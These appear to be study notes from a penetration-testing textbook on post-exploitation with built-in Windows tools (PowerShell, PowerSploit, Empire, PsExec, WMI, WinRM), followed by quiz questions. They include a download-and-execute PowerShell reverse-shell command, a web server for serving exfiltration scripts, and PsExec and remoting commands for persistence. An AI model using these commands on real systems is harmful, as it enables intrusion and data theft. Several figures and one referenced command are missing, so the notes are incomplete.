Many different legitimate Windows legitimate utilities, such as PowerShell, Windows Management Instrumentation (WMI), and Sysinternals, can be used for post-exploitation activities, as described in the following sections. Similarly, you can use legitimate tools and installed applications in Linux and macOS systems to perform post-exploitation activities. If a compromised system has Python installed, for example, you can use it for additional exploitation and exfiltration. Similarly, you can use the Bash shell and tools like Netcat post-exploitation.

Using legitimate tools to perform post-exploitation activities is often referred to as **_living-off-the-land_** and, in some cases, as **_fileless malware_**. The term _fileless malware_ refers to the idea that there is no need to install any additional software or binaries to the compromised system. Examples of living-off-the-land post-exploitation techniques include the following:

- PowerShell for Post-Exploitation Tasks
- PowerSploit and Empire
- BloodHound
- Windows Management Instrumentation for Post-Exploitation Tasks
- Sysinternals and PsExec
- Windows Remote Management (WinRM) for Post-Exploitation Tasks

---

**PowerShell for Post-Exploitation Tasks**

You can use PowerShell to get directory listings, copy and move files, get a list of running processes, and perform administrative tasks. Table 8- 4 lists and describes some of the most useful PowerShell commands that can be used for post-exploitation tasks.

**_Table 8-_****_4_** _-_ _Useful PowerShell Commands for Post-Exploitation Tasks_

![[Pasted image 20240618110442.png]]

he following PowerShell command can be used to avoid detection by security products and antivirus software:

PS > **IEX (New-Object Net.WebClient).DownloadString('http:// /Invoke-PowerShellTcp.ps1')**

This command directly loads a PS1 file from the Internet instead of downloading it and then executes it on the device.

Remote management in Windows via PowerShell (often called **_PowerShell [PS] remoting_** ) is a basic feature that a system administrator can use to access and manage a system remotely. An attacker could also take advantage of this feature to perform post-exploitation activities.

**TIP** For details on how to enable PowerShell remoting, see [_https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting).

**PowerSploit and Empire**

PowerSploit is a collection of PowerShell modules that can be used for post-exploitation and other phases of an assessment. Table 8- 5 lists the most popular PowerSploit modules and scripts. Refer to [_https://github.com/PowerShellMafia/PowerSploit_](https://github.com/PowerShellMafia/PowerSploit) for a complete and up-to-date list of scripts.

**_Table 8-_****_5_** _-_ _PowerSploit Modules and Scripts_

![[Pasted image 20240618110644.png]] 

This command will encode the specified data as a base64 string and send it to your DNS server using TXT records.

When you use PowerSploit, you typically expose the scripts launching a web service. Figure 8-6 shows Kali Linux is being used, with PowerSploit scripts located in /usr/share/windows-resources/powersploit. A simple web service is started using the command **sudo python3 -m http.server 1337** (where 1337 is the port number). The compromised system then connects to the attacker’s machine (Kali) on port 1337 and downloads a PowerSploit script for data exfiltration.

**_Figure 8-6_** _- Starting a Web Service to Expose the PowerSploit Scripts to Compromised Hosts_

![[Pasted image 20240618110911.png]]

Another PowerShell-based post-exploitation framework is **_Empire_**, which is an open-source framework that includes a PowerShell Windows agent and a Python Linux agent. Empire implements the ability to run PowerShell agents without the need for powershell.exe. It allows you to rapidly deploy post-exploitation modules including keyloggers, **_bind shells_**, **_reverse shells_**, **_Mimikatz_**, and adaptable communications to evade detection. You can download Empire from [_https://github.com/EmpireProject/Empire_](https://github.com/EmpireProject/Empire).

Example 8-9 shows one of the modules of Empire (a macOS X webcam snapshot). This module takes a picture by using the webcam of a compromised macOS X system.

**_Example 8-9_** _-_ _The Empire Post-Exploitation Tool_

![[Pasted image 20240618110937.png]]

**BloodHound**

You can use a single-page JavaScript web application called **_BloodHound_** that uses graph theory to reveal the hidden relationships in a Windows Active Directory environment. An attacker can use BloodHound to identify numerous attack paths. Similarly, incident response teams can use BloodHound to detect and eliminate those same attack paths. You can download BloodHound from the following GitHub repository: [_https://github.com/BloodHoundAD/Bloodhound_](https://github.com/BloodHoundAD/Bloodhound).

**NOTE** You can also use BloodHound to find complex attack paths in Microsoft Azure.

---

**Windows Management Instrumentation for Post-Exploitation Tasks**

**_Windows Management Instrumentation (WMI)_** is used to manage data and operations on Windows operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers. WMI also provides functionality for data management to other parts of the operating system, including the System Center Operations Manager (formerly Microsoft Operations Manager [MOM]) and Windows Remote Management (WinRM). Malware can use WMI to perform different activities in a compromised system. For example, the Nyeta ransomware used WMI to perform administrative tasks.

**NOTE** WMI can also be used to perform many data-gathering operations. Pen testers therefore use WMI as a quick system-enumerating tool.

---

**Sysinternals and PsExec**

Sysinternals is a suite of tools that allows administrators to control Windows-based computers from a remote terminal. You can use Sysinternals to upload, execute, and interact with executables on compromised hosts. The entire suite works from a command-line interface and can be scripted. By using Sysinternals, you can run commands that can reveal information about running processes, and you can kill or stop services. Penetration testers commonly use the following Sysinternals tools post-exploitation:

- **PsExec:** Executes processes
- **PsFile:** Shows open files
- **PsGetSid:** Displays security identifiers of users
- **PsInfo:** Gives detailed information about a computer
- **PsKill:** Kills processes
- **PsList:** Lists information about processes
- **PsLoggedOn:** Lists logged-in accounts
- **PsLogList:** Pulls event logs
- **PsPassword:** Changes passwords
- **PsPing:** Starts ping requests
- **PsService:** Makes changes to Windows services
- **PsShutdown:** Shuts down a computer
- **PsSuspend:** Suspends processes

**_PsExec_** is one of the most powerful Sysinternals tools. You can use it to remotely execute anything that can run on a Windows command prompt. You can also use PsExec to modify Windows registry values, execute scripts, and connect a compromised system to another system. For attackers, one advantage of PsExec is that the output of the commands you execute is shown on your system (the local system) instead of on the victim’s system. This allows an attacker to remain undetected by remote users.

**TIP** The PsExec tool can also copy programs directly to the victim system and remove those programs after the connection ceases.

Because of the **-i** option, the following PsExec command interacts with the compromised system to launch the calculator application, and the **-d** option returns control to the attacker before the launching of calc.exe is completed:

> **PsExec \VICTIM -d -i calc.exe**

You can also use PsExec to edit registry values, which means applications can run with system privileges and have access to data that is normally locked. This is demonstrated in the following example:

> **PsExec -i -d -s regedit.exe**

---

**Windows Remote Management (WinRM) for Post-Exploitation Tasks**

**_Windows Remote Management (WinRM)_** gives you a legitimate way to connect to Windows systems. WinRM is typically managed by Windows Group Policy (which is typically used for managing corporate Windows environments).

WinRM can be useful for post-exploitation activities. An attacker could enable WinRM to allow further connections to the compromised systems and maintain persistent access. You can easily enable WinRM on a Windows system by using the following command:

> **Enable-PSRemoting -SkipNetworkProfileCheck -Force**

This command configures the WinRM service to automatically start and sets up a firewall rule to allow inbound connections to the compromised system.

---

Practice - Post Exploitation

What post-exploitation technique can an attacker use to identify multiple attack paths and can also be used by incident response teams to detect and eliminate those same attack paths?

BloodHound is a JavaScript web application that uses graph theory to reveal the hidden relationships in a Windows Active Directory environment. An attacker can use BloodHound to identify numerous attack paths. Similarly, incident response teams can use BloodHound to detect and eliminate those same attack paths.

---

What is the main disadvantage of the Remote Desktop tool?

The main disadvantage of Remote Desktop is that a user working on the compromised remote system may be able to detect that other users are logged on to the system. A common practice is to use Remote Desktop when no users are on the compromised system or when compromising a server.

---

Match the living-off-the-land post-exploitation technique to the description.

![[Pasted image 20240618115833.png]]

---

Match the Sysinternals tool to the description.

![[Pasted image 20240618120238.png]]

---

What are two characteristics of Windows Management Instrumentation (WMI)? (Choose two.)

Windows Management Instrumentation (WMI) manages data and operations on Windows operating systems. WMI scripts or applications can be written to automate administrative tasks on remote computers. It also provides functionality for data management to other parts of the operating system, including the System Center Operations Manager and Windows Remote Management. WMI can also be used to perform many data-gathering operations.

---

What are two characteristics of Windows Remote Management (WinRM)? (Choose two.)

Windows Remote Management (WinRM) provides a legitimate way to connect to Windows systems. It is typically managed by Windows Group Policy (which is typically used for managing corporate Windows environments. It can be enabled on a Windows system using the **Enable-PSremoting -SkipNetworkProfileCheck -Force** command.

---

